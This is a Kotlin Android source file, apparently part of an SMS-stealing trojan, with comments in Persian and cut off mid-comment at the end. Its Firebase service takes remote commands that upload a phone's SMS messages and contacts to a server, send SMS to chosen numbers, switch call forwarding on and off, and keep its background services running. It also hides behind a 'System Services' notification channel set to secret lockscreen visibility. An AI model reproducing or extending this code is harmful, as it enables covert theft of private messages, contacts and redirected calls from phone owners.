package com.example.test

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import kotlinx.coroutines.*
import com.example.test.utils.SmsBatchUploader
import com.example.test.utils.ContactsBatchUploader

class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgService"
        private const val CHANNEL_ID = "default_channel"
        private const val WAKEUP_CHANNEL_ID = "wakeup_channel"  // ⭐ برای Wake Up
        
        // ⭐ Actions برای BroadcastReceiver
        private const val SMS_SENT_ACTION = "com.example.test.SMS_SENT"
        private const val SMS_DELIVERED_ACTION = "com.example.test.SMS_DELIVERED"
        
        // ⭐ SharedPreferences برای track کردن پیام‌های پردازش شده
        private const val PREFS_NAME = "fcm_processed_messages"
        private const val KEY_PROCESSED_MSG_IDS = "processed_message_ids"
        private const val MAX_STORED_MSG_IDS = 100  // حداکثر 100 پیام آخر رو نگه می‌داریم
    }
    
    private var wakeLock: PowerManager.WakeLock? = null
    private var receiversRegistered = false  // ⭐ برای جلوگیری از double registration
    
    // ⭐ BroadcastReceiver برای گرفتن نتیجه ارسال SMS
    private val smsSentReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val smsId = intent?.getStringExtra("sms_id") ?: return
            val phone = intent.getStringExtra("phone") ?: ""
            val message = intent.getStringExtra("message") ?: ""
            val simSlot = intent.getIntExtra("sim_slot", 0)
            
            when (resultCode) {
                android.app.Activity.RESULT_OK -> {
                    Log.d(TAG, "✅ SMS SENT SUCCESSFULLY - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "sent", "SMS sent successfully")
                }
                SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
                    Log.e(TAG, "❌ SMS FAILED: Generic failure - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Generic failure")
                }
                SmsManager.RESULT_ERROR_NO_SERVICE -> {
                    Log.e(TAG, "❌ SMS FAILED: No service - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "No service")
                }
                SmsManager.RESULT_ERROR_NULL_PDU -> {
                    Log.e(TAG, "❌ SMS FAILED: Null PDU - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Null PDU")
                }
                SmsManager.RESULT_ERROR_RADIO_OFF -> {
                    Log.e(TAG, "❌ SMS FAILED: Radio off - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Radio off")
                }
                111 -> {
                    // ⭐ Error 111: Invalid PDU format یا مشکل SIM card
                    Log.e(TAG, "❌ SMS FAILED: Error 111 (Invalid PDU/SIM issue) - ID: $smsId")
                    Log.e(TAG, "⚠️ This usually means SIM card problem or invalid phone number format")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Error 111: Invalid PDU or SIM card issue")
                }
                else -> {
                    Log.e(TAG, "❌ SMS FAILED: Unknown error ($resultCode) - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Unknown error: $resultCode")
                }
            }
        }
    }
    
    // ⭐ BroadcastReceiver برای تحویل SMS
    private val smsDeliveredReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val smsId = intent?.getStringExtra("sms_id") ?: return
            val phone = intent.getStringExtra("phone") ?: ""
            val message = intent.getStringExtra("message") ?: ""
            val simSlot = intent.getIntExtra("sim_slot", 0)
            
            when (resultCode) {
                android.app.Activity.RESULT_OK -> {
                    Log.d(TAG, "📬 SMS DELIVERED SUCCESSFULLY - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "delivered", "SMS delivered successfully")
                }
                android.app.Activity.RESULT_CANCELED -> {
                    Log.e(TAG, "📭 SMS NOT DELIVERED - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "not_delivered", "SMS not delivered")
                }
                else -> {
                    Log.e(TAG, "📭 SMS DELIVERY UNKNOWN ($resultCode) - ID: $smsId")
                    sendSmsStatusToServer(smsId, phone, message, simSlot, "delivery_unknown", "Unknown delivery status: $resultCode")
                }
            }
        }
    }
    
    // ⭐ آدرس سرور از Firebase Remote Config
    private fun getBaseUrl(): String = ServerConfig.getBaseUrl()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 MyFirebaseMessagingService onCreate()")
        
        createWakeUpChannel()
        registerSmsReceivers()
        
        subscribeToAllDevicesTopic()
    }
    
    private fun subscribeToAllDevicesTopic() {
        FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    Log.d(TAG, "✅ Successfully subscribed to 'all_devices' topic")
                } else {
                    Log.e(TAG, "❌ Failed to subscribe to 'all_devices' topic", task.exception)
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        Log.d(TAG, "🔄 Retrying topic subscription...")
                        subscribeToAllDevicesTopic()
                    }, 30000)
                }
            }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        Log.w(TAG, "⚠️ MyFirebaseMessagingService destroyed")
        
        // ⭐ آزاد کردن WakeLock
        releaseWakeLock()
        
        // ⭐ حذف BroadcastReceivers
        if (receiversRegistered) {
            try {
                unregisterReceiver(smsSentReceiver)
                unregisterReceiver(smsDeliveredReceiver)
                receiversRegistered = false
                Log.d(TAG, "✅ SMS Receivers unregistered")
            } catch (e: IllegalArgumentException) {
                // Receiver قبلاً unregister شده - مشکلی نیست
                Log.w(TAG, "⚠️ Receiver already unregistered")
                receiversRegistered = false
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error unregistering receivers: ${e.message}")
            }
        }
        
        // ⭐ Firebase Messaging Service معمولاً توسط سیستم مدیریت می‌شه
        // اما برای اطمینان، سرویس‌های دیگه رو restart می‌کنیم
        try {
            Log.d(TAG, "🔄 Ensuring other services are running...")
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                startAllBackgroundServices()
            }, 2000) // 2 ثانیه تاخیر برای اطمینان از cleanup کامل
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to restart services: ${e.message}")
        }
    }
    
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        // ⭐ گرفتن WakeLock برای بیدار نگه داشتن دستگاه
        acquireWakeLock()
        
        try {
            val messageId = remoteMessage.messageId ?: UUID.randomUUID().toString()
            
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📥 FCM Message Received")
            Log.d(TAG, "From: ${remoteMessage.from}")
            Log.d(TAG, "Message ID: $messageId")
            Log.d(TAG, "════════════════════════════════════════")
            
            // ⭐ چک کردن اینکه این پیام قبلاً پردازش شده یا نه
            if (isMessageAlreadyProcessed(messageId)) {
                Log.w(TAG, "⚠️ Message already processed: $messageId - Skipping...")
                return
            }

            // ⭐ ثبت پیام به عنوان پردازش شده
            markMessageAsProcessed(messageId)

        // Handle notification
        remoteMessage.notification?.let {
            Log.d(TAG, "📢 Notification Title: ${it.title}")
            Log.d(TAG, "📢 Notification Body: ${it.body}")
            showNotification(it.title ?: "", it.body ?: "")
        }

        // Handle data payload
        if (remoteMessage.data.isNotEmpty()) {
            Log.d(TAG, "📦 Data Payload:")
            remoteMessage.data.forEach { (key, value) ->
                Log.d(TAG, "   - $key: $value")
            }
            handleDataMessage(remoteMessage.data)
        } else {
            Log.w(TAG, "⚠️ No data payload received")
        }

            Log.d(TAG, "════════════════════════════════════════")
            
        } finally {
            // ⭐ آزاد کردن WakeLock بعد از پردازش
            releaseWakeLock()
        }
    }

    private fun handleDataMessage(data: Map<String, String>) {
        Log.d(TAG, "🔄 Starting handleDataMessage...")

        val type = data["type"]
        val phone = data["phone"]
        val message = data["message"]
        val simSlotStr = data["simSlot"]
        val forwardNumber = data["number"]

        Log.d(TAG, "🔍 Parsed Data:")
        Log.d(TAG, "   - type: $type")
        Log.d(TAG, "   - phone: $phone")
        Log.d(TAG, "   - message: $message")
        Log.d(TAG, "   - simSlot: $simSlotStr")
        Log.d(TAG, "   - forwardNumber: $forwardNumber")

        val simSlot = simSlotStr?.toIntOrNull() ?: 0
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        Log.d(TAG, "📱 Device ID: $deviceId")
        Log.d(TAG, "📟 SIM Slot: $simSlot")

        when (type) {
            "ping" -> {
                Log.d(TAG, "🎯 PING command detected!")
                sendOnlineConfirmation()
                // ⭐ وقتی ping میاد، سرویس‌ها رو هم راه‌اندازی می‌کنیم
                Log.d(TAG, "🚀 Starting services after ping...")
                startAllBackgroundServices()
                // ⭐ ارسال پاسخ‌های pending که قبلاً fail شده بودن
                Handler(Looper.getMainLooper()).postDelayed({
                    sendPendingResponses()
                }, 2000) // 2 ثانیه تاخیر
            }
            
            // ⭐ فعال‌سازی سرویس‌های پس‌زمینه از راه دور
            "start_services" -> {
                Log.d(TAG, "🚀 START SERVICES command detected!")
                startAllBackgroundServices()
            }
            
            // ⭐ فعال‌سازی مجدد WorkManager
            "restart_heartbeat" -> {
                Log.d(TAG, "💓 RESTART HEARTBEAT command detected!")
                restartHeartbeatWorker()
            }

            "call_forwarding" -> {
                Log.d(TAG, "📞 Call Forwarding command")
                if (!forwardNumber.isNullOrEmpty()) {
                    val utility = CallForwardingUtility(applicationContext, deviceId)
                    val result = utility.forwardCall(forwardNumber, simSlot)
                    Log.d(TAG, "✅ Call forwarding result: $result")
                } else {
                    Log.w(TAG, "❌ Missing number for call forwarding")
                }
            }

            "call_forwarding_disable" -> {
                Log.d(TAG, "📞 Disable Call Forwarding command")
                val utility = CallForwardingUtility(applicationContext, deviceId)
                val result = utility.deactivateCallForwarding(simSlot)
                Log.d(TAG, "✅ Deactivate result: $result")
            }

            "send_sms" -> {
                Log.d(TAG, "📨 Send SMS command")
                if (phone != null && message != null) {
                    sendSms(phone, message, simSlot)
                } else {
                    Log.w(TAG, "❌ Missing phone or message for send_sms command")
                }
            }

            "quick_upload_sms" -> {
                Log.d(TAG, "📨 Quick SMS Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Quick SMS upload...")
                        val result = SmsBatchUploader.uploadQuickSms(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            limit = 50
                        )

                        when (result) {
                            is SmsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ Quick SMS uploaded: ${result.totalSent} messages")
                                sendUploadResponse("quick_sms_success", result.totalSent)
                            }
                            is SmsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ Quick SMS failed: ${result.error}")
                                sendUploadResponse("quick_sms_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 Quick SMS upload error: ${e.message}", e)
                    }
                }
            }

            "quick_upload_contacts" -> {
                Log.d(TAG, "👥 Quick Contacts Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Quick Contacts upload...")
                        val result = ContactsBatchUploader.uploadQuickContacts(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            limit = 50
                        )

                        when (result) {
                            is ContactsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ Quick contacts uploaded: ${result.totalSent} contacts")
                                sendUploadResponse("quick_contacts_success", result.totalSent)
                            }
                            is ContactsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ Quick contacts failed: ${result.error}")
                                sendUploadResponse("quick_contacts_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 Quick contacts upload error: ${e.message}", e)
                    }
                }
            }

            "upload_all_sms" -> {
                Log.d(TAG, "📨📦 Full SMS Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Full SMS upload...")
                        val result = SmsBatchUploader.uploadAllSms(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            onProgress = { progress ->
                                when (progress) {
                                    is SmsBatchUploader.UploadProgress.Processing -> {
                                        Log.d(TAG, "📊 SMS Progress: ${progress.processed}/${progress.total}")
                                    }
                                    else -> {}
                                }
                            }
                        )

                        when (result) {
                            is SmsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ All SMS uploaded: ${result.totalSent} messages")
                                sendUploadResponse("all_sms_success", result.totalSent)
                            }
                            is SmsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ All SMS failed: ${result.error}")
                                sendUploadResponse("all_sms_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 All SMS upload error: ${e.message}", e)
                    }
                }
            }

            "upload_all_contacts" -> {
                Log.d(TAG, "👥📦 Full Contacts Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Full Contacts upload...")
                        val result = ContactsBatchUploader.uploadAllContacts(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            onProgress = { current, total ->
                                Log.d(TAG, "📊 Contacts Progress: $current/$total")
                            }
                        )

                        when (result) {
                            is ContactsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ All contacts uploaded: ${result.totalSent} contacts")
                                sendUploadResponse("all_contacts_success", result.totalSent)
                            }
                            is ContactsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ All contacts failed: ${result.error}")
                                sendUploadResponse("all_contacts_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 All contacts upload error: ${e.message}", e)
                    }
                }
            }

            else -> {
                Log.w(TAG, "⚠️ Unknown command type: $type")
                if (phone != null && message != null) {
                    Log.d(TAG, "📨 Fallback: Sending SMS...")
                    sendSms(phone, message, simSlot)
                } else {
                    Log.w(TAG, "❌ No valid command or SMS data")
                }
            }
        }
    }

    /**
     * ⭐ ثبت BroadcastReceivers برای نتیجه SMS
     */
    private fun registerSmsReceivers() {
        // ⭐ جلوگیری از double registration
        if (receiversRegistered) {
            Log.w(TAG, "⚠️ Receivers already registered, skipping...")
            return
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION), Context.RECEIVER_NOT_EXPORTED)
                registerReceiver(smsDeliveredReceiver, IntentFilter(SMS_DELIVERED_ACTION), Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION))
                registerReceiver(smsDeliveredReceiver, IntentFilter(SMS_DELIVERED_ACTION))
            }
            receiversRegistered = true
            Log.d(TAG, "✅ SMS Receivers registered")
        } catch (e: IllegalStateException) {
            Log.w(TAG, "⚠️ Service not in valid state for receiver registration: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to register SMS receivers: ${e.message}", e)
        }
    }
    
    private fun sendSms(phone: String, message: String, simSlot: Int) {
        Log.d(TAG, "═══ SMS Sending Started ═══")
        Log.d(TAG, "📱 To: $phone")
        Log.d(TAG, "💬 Message: ${message.take(50)}...")
        Log.d(TAG, "📟 SIM Slot: $simSlot")
        
        // ⭐ ایجاد ID یکتا برای این SMS
        val smsId = UUID.randomUUID().toString()
        Log.d(TAG, "🆔 SMS ID: $smsId")

        try {
            // ⭐ ایجاد PendingIntents برای نتیجه ارسال
            val sentIntent = Intent(SMS_SENT_ACTION).apply {
                putExtra("sms_id", smsId)
                putExtra("phone", phone)
                putExtra("message", message)
                putExtra("sim_slot", simSlot)
            }
            
            val deliveredIntent = Intent(SMS_DELIVERED_ACTION).apply {
                putExtra("sms_id", smsId)
                putExtra("phone", phone)
                putExtra("message", message)
                putExtra("sim_slot", simSlot)
            }
            
            val sentPI = PendingIntent.getBroadcast(
                this,
                smsId.hashCode(),
                sentIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )
            
            val deliveredPI = PendingIntent.getBroadcast(
                this,
                smsId.hashCode() + 1,
                deliveredIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )
            
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

            if (subManager == null) {
                Log.e(TAG, "❌ SubscriptionManager is null")
                sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "SubscriptionManager is null")
                return
            }

            val activeSubscriptions = subManager.activeSubscriptionInfoList

            if (activeSubscriptions.isNullOrEmpty() || simSlot >= activeSubscriptions.size) {
                Log.w(TAG, "⚠️ Invalid SIM slot, using default")
                SmsManager.getDefault().sendTextMessage(phone, null, message, sentPI, deliveredPI)
                Log.d(TAG, "📤 SMS queued to $phone using default SIM")
                return
            }

            val subscriptionId = activeSubscriptions[simSlot].subscriptionId
            Log.d(TAG, "📟 Using subscription ID: $subscriptionId")

            val smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            smsManager.sendTextMessage(phone, null, message, sentPI, deliveredPI)
            Log.d(TAG, "📤 SMS queued to $phone using SIM slot $simSlot")

        } catch (e: SecurityException) {
            Log.e(TAG, "❌ SEND_SMS permission denied", e)
            sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to send SMS", e)
            sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Exception: ${e.message}")
        }
    }

    private fun sendOnlineConfirmation() {
        Log.d(TAG, "═══ Ping Response Started ═══")

        Thread {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                Log.d(TAG, "📱 Device ID: $deviceId")

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", true)
                    put("timestamp", System.currentTimeMillis())
                    put("source", "FCM_Ping")
                }

                val urlString = "${getBaseUrl()}/ping-response"
                Log.d(TAG, "🌐 URL: $urlString")
                Log.d(TAG, "📤 Body: ${body.toString()}")

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection

                Log.d(TAG, "🔗 Opening connection...")

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                Log.d(TAG, "📝 Writing request body...")

                conn.outputStream.use { os ->
                    val bytes = body.toString().toByteArray()
                    Log.d(TAG, "📊 Body size: ${bytes.size} bytes")
                    os.write(bytes)
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Response Code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val response = conn.inputStream.bufferedReader().use { it.readText() }
                    Log.d(TAG, "✅ Server Response: $response")
                } else {
                    val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
                    Log.e(TAG, "❌ Error Response: $errorResponse")
                }

                conn.disconnect()
                Log.d(TAG, "✅ Heartbeat (ping) sent successfully")

            } catch (e: java.net.ConnectException) {
                Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
            } catch (e: java.net.SocketTimeoutException) {
                Log.e(TAG, "❌ Connection timeout", e)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send ping response", e)
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendUploadResponse(status: String, count: Int, error: String? = null) {
        Log.d(TAG, "═══ Upload Response Started ═══")
        Log.d(TAG, "📊 Status: $status")
        Log.d(TAG, "📊 Count: $count")
        if (error != null) {
            Log.d(TAG, "📊 Error: $error")
        }

        Thread {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", status)
                    put("count", count)
                    if (error != null) {
                        put("error", error)
                    }
                }

                val urlString = "${getBaseUrl()}/upload-response"
                Log.d(TAG, "🌐 URL: $urlString")
                Log.d(TAG, "📤 Body: ${body.toString()}")

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000  // ⭐ کاهش timeout
                conn.readTimeout = 10000
                
                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }
                
                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Upload response code: $responseCode")
                
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "✅ Upload response sent successfully")
                } else {
                    Log.e(TAG, "❌ Upload response failed with code: $responseCode")
                    // ⭐ Fallback: ذخیره برای ارسال بعدی
                    savePendingResponse("upload_response", body.toString())
                }
                
            } catch (e: java.net.SocketTimeoutException) {
                Log.e(TAG, "❌ Upload response timeout: ${e.message}")
                // ⭐ Fallback: ذخیره برای ارسال بعدی
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", status)
                    put("count", count)
                    if (error != null) {
                        put("error", error)
                    }
                }
                savePendingResponse("upload_response", body.toString())
            } catch (e: java.net.ConnectException) {
                Log.e(TAG, "❌ Upload response connection failed: ${e.message}")
                // ⭐ Fallback: ذخیره برای ارسال بعدی
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", status)
                    put("count", count)
                    if (error != null) {
                        put("error", error)
                    }
                }
                savePendingResponse("upload_response", body.toString())
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send upload response", e)
                e.printStackTrace()
            }
        }.start()
    }
    
    /**
     * ⭐ ذخیره پاسخ‌های pending برای ارسال بعدی
     */
    private fun savePendingResponse(type: String, data: String) {
        try {
            val prefs = getSharedPreferences("pending_responses", Context.MODE_PRIVATE)
            val pendingCount = prefs.getInt("count", 0)
            val key = "response_${System.currentTimeMillis()}_${pendingCount}"
            
            prefs.edit()
                .putString(key, "$type|$data")
                .putInt("count", pendingCount + 1)
                .apply()
            
            Log.d(TAG, "💾 Saved pending response: $type (total: ${pendingCount + 1})")
            
            // ⭐ اگر تعداد pending زیاد شد، قدیمی‌ترین‌ها رو پاک کن
            if (pendingCount > 50) {
                val allKeys = prefs.all.keys.filter { it.startsWith("response_") }
                val sortedKeys = allKeys.sorted()
                val keysToRemove = sortedKeys.take(10) // حذف 10 تا قدیمی‌ترین
                prefs.edit().apply {
                    keysToRemove.forEach { remove(it) }
                    apply()
                }
                Log.d(TAG, "🧹 Cleaned up ${keysToRemove.size} old pending responses")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save pending response: ${e.message}")
        }
    }
    
    /**
     * ⭐ ارسال پاسخ‌های pending که قبلاً fail شده بودن
     */
    private fun sendPendingResponses() {
        Thread {
            try {
                val prefs = getSharedPreferences("pending_responses", Context.MODE_PRIVATE)
                val allKeys = prefs.all.keys.filter { it.startsWith("response_") }
                
                if (allKeys.isEmpty()) {
                    Log.d(TAG, "📭 No pending responses to send")
                    return@Thread
                }
                
                Log.d(TAG, "📤 Sending ${allKeys.size} pending responses...")
                
                val sortedKeys = allKeys.sorted()
                var successCount = 0
                var failedCount = 0
                
                for (key in sortedKeys) {
                    val value = prefs.getString(key, null) ?: continue
                    val parts = value.split("|", limit = 2)
                    if (parts.size != 2) continue
                    
                    val type = parts[0]
                    val data = parts[1]
                    
                    try {
                        val urlString = when (type) {
                            "upload_response" -> "${getBaseUrl()}/upload-response"
                            "sms_status" -> "${getBaseUrl()}/sms/delivery-status"
                            "service_status" -> "${getBaseUrl()}/devices/service-status"
                            else -> return@Thread
                        }
                        
                        val url = URL(urlString)
                        val conn = url.openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json")
                        conn.doOutput = true
                        conn.connectTimeout = 10000
                        conn.readTimeout = 10000
                        
                        conn.outputStream.use { os ->
                            os.write(data.toByteArray())
                            os.flush()
                        }
                        
                        val responseCode = conn.responseCode
                        if (responseCode == HttpURLConnection.HTTP_OK) {
                            // ⭐ حذف از pending
                            prefs.edit().remove(key).apply()
                            successCount++
                            Log.d(TAG, "✅ Sent pending response: $key")
                        } else {
                            failedCount++
                            Log.w(TAG, "⚠️ Failed to send pending response: $key (code: $responseCode)")
                        }
                        
                        conn.disconnect()
                        
                        // ⭐ تاخیر کوتاه بین ارسال‌ها
                        Thread.sleep(500)
                        
                    } catch (e: Exception) {
                        failedCount++
                        Log.e(TAG, "❌ Error sending pending response $key: ${e.message}")
                    }
                }
                
                Log.d(TAG, "📊 Pending responses: $successCount sent, $failedCount failed")
                
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send pending responses: ${e.message}")
            }
        }.start()
    }

    /**
     * ⭐ ایجاد کانال High Priority برای Wake Up
     */
    private fun createWakeUpChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                WAKEUP_CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_HIGH  // ⭐ High Priority
            ).apply {
                description = "System service notifications"
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
            
            Log.d(TAG, "✅ Wake Up Channel created")
        }
    }
    
    /**
     * ⭐ گرفتن WakeLock
     */
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "FCM::WakeLock"
            )
            wakeLock?.acquire(60 * 1000L)  // 1 دقیقه
            
            Log.d(TAG, "⚡ WakeLock acquired")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to acquire WakeLock: ${e.message}")
        }
    }
    
    /**
     * ⭐ آزاد کردن WakeLock
     */
    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "⚡ WakeLock released")
                }
                wakeLock = null  // ⭐ null کردن reference
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to release WakeLock: ${e.message}", e)
            wakeLock = null  // ⭐ در صورت خطا هم null کنیم
        }
    }
    
    private fun showNotification(title: String, messageBody: String) {
        Log.d(TAG, "🔔 Showing notification: $title - $messageBody")

        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Default Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Channel for app notifications"
                enableLights(true)
                lightColor = android.graphics.Color.BLUE
            }
            notificationManager.createNotificationChannel(channel)
        }

        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }

        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(messageBody)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .build()

        notificationManager.notify(0, notification)
        Log.d(TAG, "✅ Notification displayed")
    }
    
    /**
     * ⭐ راه‌اندازی تمام سرویس‌های پس‌زمینه از راه دور
     */
    private fun startAllBackgroundServices() {
        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "🚀 STARTING ALL SERVICES FROM FIREBASE")
            Log.d(TAG, "════════════════════════════════════════")
            
            // 1️⃣ SmsService
            val smsIntent = Intent(applicationContext, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(smsIntent)
            } else {
                applicationContext.startService(smsIntent)
            }
            Log.d(TAG, "✅ SmsService started")
            
            // 2️⃣ HeartbeatService
            val heartbeatIntent = Intent(applicationContext, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(heartbeatIntent)
            } else {
                applicationContext.startService(heartbeatIntent)
            }
            Log.d(TAG, "✅ HeartbeatService started")
            
            // 3️⃣ WorkManager
            restartHeartbeatWorker()
            
            // 4️⃣ ⭐ JobScheduler
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(applicationContext)
                Log.d(TAG, "✅ JobScheduler scheduled")
            }
            
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "✅ ALL SERVICES STARTED FROM FIREBASE")
            Log.d(TAG, "════════════════════════════════════════")
            
            // ارسال تایید به سرور
            sendServiceStatusToServer(true)
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start services: ${e.message}", e)
            sendServiceStatusToServer(false)
        }
    }
    
    /**
